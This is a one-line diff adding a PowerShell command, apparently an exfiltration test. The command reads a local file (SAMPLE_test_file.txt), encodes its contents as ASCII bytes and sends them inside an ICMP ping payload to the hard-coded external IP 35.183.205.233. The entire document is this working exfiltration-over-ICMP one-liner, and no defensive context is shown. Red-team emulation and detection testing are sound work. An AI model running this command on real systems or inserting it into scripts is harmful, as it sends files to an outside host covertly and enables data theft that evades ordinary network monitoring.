@@ -1,0 +1,1 @@
+$text=Get-Content SAMPLE_test_file.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(‘35.183.205.233',60 * 1000, $sendbytes, $PingOptions);
